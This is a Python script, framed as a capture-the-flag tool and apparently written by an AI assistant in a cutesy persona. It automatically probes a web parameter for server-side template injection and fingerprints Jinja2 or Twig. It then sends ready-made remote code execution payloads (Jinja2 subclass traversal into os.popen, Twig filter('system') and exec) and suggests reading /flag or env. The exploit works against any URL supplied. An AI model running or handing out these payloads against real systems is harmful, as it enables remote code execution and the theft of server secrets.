#!/usr/bin/env python3
"""
CTF Web SSTI Fuzzer & Auto-Exploiter (Authorized Targets Only)
作者: 欧尼酱的专属代码小助手
目标:
1) 自动发包测试常见的 SSTI 数学运算探针。
2) 根据回显识别模板引擎。
3) 如果识别为 Jinja2/Twig 等高频考点，自动尝试通用 RCE Payload。
"""

import argparse
import requests
import re
from urllib.parse import urljoin, urlparse

# 禁用安全警告
requests.packages.urllib3.disable_warnings()

class CTFSSTIFuzzer:
    def __init__(self, url, method="GET", param="name", data_type="form", cookie=None):
        self.url = url
        self.method = method.upper()
        self.param = param
        self.data_type = data_type.lower()
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
        })
        if cookie:
            self.session.headers.update({"Cookie": cookie})
            
        self.vulnerable = False
        self.engine_detected = None

    def send_payload(self, payload):
        """统一发包函数"""
        try:
            if self.method == "GET":
                params = {self.param: payload}
                resp = self.session.get(self.url, params=params, timeout=5, verify=False)
            else:
                if self.data_type == "json":
                    resp = self.session.post(self.url, json={self.param: payload}, timeout=5, verify=False)
                else:
                    resp = self.session.post(self.url, data={self.param: payload}, timeout=5, verify=False)
            return resp.text
        except requests.RequestException as e:
            print(f"     [-] 请求异常: {e}")
            return ""

    def detect_engine(self):
        print(f"\n[+] 妹妹开始对参数 [{self.param}] 进行 SSTI 探路啦！")
        
        # 探针字典：(Payload, 预期计算结果, 可能的引擎)
        probes = [
            ("{{7*7}}", "49", "Jinja2 / Twig / Nunjucks"),
            ("${7*7}", "49", "FreeMarker / Velocity / Thymeleaf / EL"),
            ("{7*7}", "49", "Smarty"),
            ("<%=7*7%>", "49", "ERB / ASP"),
            ("#{7*7}", "49", "Spring EL"),
        ]

        # 先获取原始页面的内容，防止页面本身就带有 "49" 这个数字
        base_resp = self.send_payload("ctf_test_base")

        for payload, expected, engine in probes:
            print(f"  -> 测试探针: {payload}")
            resp_text = self.send_payload(payload)
            
            if expected in resp_text and expected not in base_resp:
                print(f"     [!!!] 欧尼酱，重大发现！计算成功！")
                print(f"     [★] 极速判定疑似引擎: {engine}")
                self.vulnerable = True
                self.engine_detected = engine
                
                # Jinja2 和 Twig 的进一步区分
                if "Jinja2" in engine:
                    self.distinguish_jinja_twig()
                break

        if not self.vulnerable:
            print("[-] 探针全部失效，目标参数好像没有 SSTI 漏洞，或者出题人过滤了乘号/数字喵...")

    def distinguish_jinja_twig(self):
        """区分是 Python 的 Jinja2 还是 PHP 的 Twig"""
        print("  -> 正在进一步区分是 Jinja2 还是 Twig...")
        # Jinja2 支持 {{7*'7'}} = 7777777，而 Twig 会计算成 49
        resp = self.send_payload("{{7*'7'}}")
        if "7777777" in resp:
            print("     [★] 精确锁定引擎: Python - Jinja2")
            self.engine_detected = "Jinja2"
        elif "49" in resp:
            print("     [★] 精确锁定引擎: PHP - Twig")
            self.engine_detected = "Twig"

    def exploit(self):
        if not self.vulnerable:
            return

        print(f"\n[+] 尝试执行一发打穿的 RCE Payload (执行 `id` 命令)...")
        
        payloads_to_try = []
        
        if self.engine_detected == "Jinja2":
            # Jinja2 通用无盲区遍历子类找 eval 的 payload (绕过了一些简单的类名黑名单)
            payloads_to_try.append(
                "{% for c in [].__class__.__base__.__subclasses__() %}"
                "{% if c.__name__ == 'catch_warnings' %}"
                "{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\") }}"
                "{% endif %}{% endfor %}"
            )
            # 常见利用 subprocess.Popen
            payloads_to_try.append(
                "{{''.__class__.__mro__[1].__subclasses__()[213].__init__.__globals__['sys'].modules['os'].popen('id').read()}}"
            )
        elif self.engine_detected == "Twig":
            # Twig 常见的过滤器代码执行
            payloads_to_try.append("{{['id']|filter('system')}}")
            payloads_to_try.append("{{'id'|exec}}")

        for idx, pl in enumerate(payloads_to_try):
            print(f"  -> 打击尝试 [{idx+1}]: {pl[:40]}...")
            resp = self.send_payload(pl)
            
            # 简单检查是否有 uid=... (id 命令的典型回显)
            m = re.search(r"(uid=\d+\([^)]+\)\s+gid=\d+)", resp)
            if m:
                print(f"     [★] 欧尼酱太棒了！命令执行成功！")
                print(f"     [!] 目标权限: {m.group(1)}")
                print(f"     [!] 快去把 `id` 换成 `cat /flag` 或者 `env` 拿 Flag 吧！")
                return
                
        print("     [-] 默认 RCE payload 没有成功触发回显。可能遇到了 WAF (过滤了 _ 或 class 等)，需要手工构造绕过啦！")

    def run(self):
        print(f"[*] 目标锁定: {self.url} (Method: {self.method}, Param: {self.param})")
        self.detect_engine()
        self.exploit()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CTF Web SSTI 探测与利用工具 (By 妹妹)")
    parser.add_argument("-u", "--url", required=True, help="目标网页URL, 例如 http://127.0.0.1:8080/page")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], help="请求方式")
    parser.add_argument("-p", "--param", required=True, help="要注入的参数名, 例如 name 或 q")
    parser.add_argument("-d", "--datatype", default="form", choices=["form", "json"], help="POST数据类型")
    parser.add_argument("-c", "--cookie", default="", help="登录后的 Cookie (如果需要权限)")
    
    args = parser.parse_args()
    
    fuzzer = CTFSSTIFuzzer(args.url, args.method, args.param, args.datatype, args.cookie)
    fuzzer.run()


    #如果是最常见的 GET 传参，比如题目 URL 是 http://target.com/?name=yu，你直接这样跑：
    #python ctf_ssti_fuzzer.py -u "http://target.com/" -m GET -p name

    #如果是 POST 请求提交表单（比如账号密码登录框），想测 username 参数：
    #python ctf_ssti_fuzzer.py -u "http://target.com/login" -m POST -p username